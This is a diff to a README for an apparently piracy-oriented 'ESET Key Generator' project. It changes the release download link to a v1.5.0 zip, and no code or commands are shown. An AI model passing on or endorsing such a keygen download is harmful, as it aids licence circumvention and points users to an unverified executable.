@@ -26,7 +26,7 @@ You can [install](https://github.com/FrostUNK/Eset_Key_Generator/releases/downlo
 
 ## Finished Image
 
-Install it from the [Releases](https://github.com/FrostUNK/Eset_Key_Generator/releases/download/v1.0.0/Realese.zip)
+Install it from the [Releases](https://github.com/FrostUNK/ESET_Key_Generator/releases/download/v1.5.0/Release.zip)
 
 ## With the Code
 
